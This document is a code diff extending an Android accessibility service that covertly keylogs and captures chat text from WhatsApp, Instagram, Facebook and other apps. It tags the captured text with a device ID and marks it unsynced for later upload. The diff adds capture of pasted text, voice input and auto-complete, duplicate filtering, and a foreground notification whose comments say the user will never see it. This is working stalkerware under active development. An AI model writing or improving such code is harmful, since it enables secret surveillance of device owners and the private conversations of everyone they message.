@@ -28,6 +28,7 @@ class KeyboardCaptureService : AccessibilityService() {
     private lateinit var deviceRegistrationManager: com.chats.capture.managers.DeviceRegistrationManager
     
     private val targetAppPackages = setOf(
+        "com.chats.capture", // Our own app (debug screen) handled by EnhancedAccessibilityService
         "com.whatsapp",
         "com.instagram.android",
         "com.facebook.katana",
@@ -43,10 +44,18 @@ class KeyboardCaptureService : AccessibilityService() {
     private var lastTextBuffer = ""
     private var lastPackageName = ""
     private var lastChatIdentifier: String? = null
+    private var lastKeylogTimestampByPackage: MutableMap<String, Long> = mutableMapOf()
+    private val keylogCooldownMs = 1500L
     
     override fun onServiceConnected() {
         super.onServiceConnected()
         Timber.d("KeyboardCaptureService connected")
+
+        // Global kill-switch: if capture is disabled, avoid initialization/foreground start.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            Timber.d("Capture disabled - skipping KeyboardCaptureService initialization")
+            return
+        }
         
         val database = (application as CaptureApplication).database
         chatDao = database.chatDao()
@@ -61,6 +70,10 @@ class KeyboardCaptureService : AccessibilityService() {
     }
     
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        // Global kill-switch: if capture is disabled, do nothing.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            return
+        }
         // Capture keyboard input from non-target apps only
         // Target apps are handled by EnhancedAccessibilityService with better data (proper chatIdentifier)
         when (event.eventType) {
@@ -70,9 +83,11 @@ class KeyboardCaptureService : AccessibilityService() {
                 // Skip target apps - EnhancedAccessibilityService handles them
                 if (!isTargetApp(packageName)) {
                     // Capture keylogs from non-target apps only
-                handleKeylog(event)
+                    handleKeylog(event)
                     // Also handle chat capture for non-target apps
                     handleTextChanged(event)
+                    // Handle auto-complete (detected via text changes)
+                    handleAutoComplete(event)
                 }
             }
             AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
@@ -90,12 +105,23 @@ class KeyboardCaptureService : AccessibilityService() {
             return
         }
         
+        val now = System.currentTimeMillis()
+        val lastKeylogTime = lastKeylogTimestampByPackage[packageName] ?: 0L
+        if (now - lastKeylogTime < keylogCooldownMs) {
+            return
+        }
+        
         // Only capture meaningful text (length > 1)
         if (text.isNotBlank() && text.length > 1) {
             serviceScope.launch {
                 try {
                     val appName = getAppName(packageName)
                     val deviceId = deviceRegistrationManager.getDeviceId()
+                    
+                    val duplicate = chatDao.findDuplicateChat(packageName, text, now)
+                    if (duplicate != null) {
+                        return@launch
+                    }
                     
                     // Store keylog as chat data (can be filtered later)
                     val keylogData = ChatData(
@@ -104,7 +130,7 @@ class KeyboardCaptureService : AccessibilityService() {
                         appName = appName,
                         chatIdentifier = "KEYLOG",
                         text = text,
-                        timestamp = System.currentTimeMillis(),
+                        timestamp = now,
                         synced = false
                     )
                     
@@ -114,6 +140,7 @@ class KeyboardCaptureService : AccessibilityService() {
                     // Update last captured values
                     lastTextBuffer = text
                     lastPackageName = packageName
+                    lastKeylogTimestampByPackage[packageName] = now
                 } catch (e: Exception) {
                     Timber.e(e, "Error capturing keylog")
                 }
@@ -129,8 +156,14 @@ class KeyboardCaptureService : AccessibilityService() {
         val packageName = event.packageName?.toString() ?: return
         val text = event.text?.firstOrNull()?.toString() ?: ""
         
-        // Debounce: Only capture if text actually changed
-        if (text == lastTextBuffer && packageName == lastPackageName) {
+        // Get before and after text to detect paste/voice-to-text
+        val beforeText = event.beforeText?.toString() ?: ""
+        val afterText = text
+        val textChangeSize = afterText.length - beforeText.length
+        val isLargeInsertion = textChangeSize > 10
+        
+        // Debounce: Only capture if text actually changed (but allow large insertions)
+        if (!isLargeInsertion && text == lastTextBuffer && packageName == lastPackageName) {
             return
         }
         
@@ -138,18 +171,26 @@ class KeyboardCaptureService : AccessibilityService() {
         val chatIdentifier = extractChatIdentifier(event)
         
         // Only capture if we have meaningful text
-        if (text.isNotBlank() && text.length > 1) {
+        if (text.isNotBlank() && text.length > 0) {
             serviceScope.launch {
                 try {
                     val appName = getAppName(packageName)
+                    val deviceId = deviceRegistrationManager.getDeviceId()
+                    val now = System.currentTimeMillis()
+                    
+                    val duplicate = chatDao.findDuplicateChat(packageName, text, now)
+                    if (duplicate != null) {
+                        return@launch
+                    }
                     
                     val chatData = ChatData(
+                        deviceId = deviceId,
                         appPackage = packageName,
                         appName = appName,
                         chatIdentifier = chatIdentifier,
                         chatName = chatIdentifier,
                         text = text,
-                        timestamp = System.currentTimeMillis(),
+                        timestamp = now,
                         synced = false
                     )
                     
@@ -205,22 +246,39 @@ class KeyboardCaptureService : AccessibilityService() {
         )
         
         // Create completely silent and invisible notification (required for foreground service)
+        // User will never see this notification - completely invisible
         val notification = NotificationCompat.Builder(this, KEYBOARD_CHANNEL_ID)
-            .setContentTitle("") // Empty title
-            .setContentText("") // Empty text
-            .setSmallIcon(android.R.drawable.ic_menu_info_details) // System icon (less visible)
+            .setContentTitle("") // Empty title - completely invisible
+            .setContentText("") // Empty text - completely invisible
+            .setSmallIcon(android.R.drawable.ic_menu_info_details) // Minimal system icon - least visible
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority - won't show
             .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden everywhere
             .setShowWhen(false) // Don't show timestamp
             .setSilent(true) // Completely silent
             .setCategory(NotificationCompat.CATEGORY_SERVICE) // System service category
+            .setLocalOnly(true) // Only local, not synced
+            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE) // Immediate start
             .build()
         
         if (android.os.Build.VERSION.SDK_INT >= 34) {
             startForeground(KEYBOARD_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
         } else {
             startForeground(KEYBOARD_SERVICE_ID, notification)
+        }
+    }
+    
+    /**
+     * Handle auto-complete suggestions for non-target apps
+     */
+    private fun handleAutoComplete(event: AccessibilityEvent) {
+        val packageName = event.packageName?.toString() ?: return
+        val text = event.text?.firstOrNull()?.toString() ?: ""
+        
+        if (text.isNotBlank()) {
+            Timber.d("Auto-complete selected in $packageName: $text")
+            // Treat auto-complete as text change
+            handleTextChanged(event)
         }
     }
     
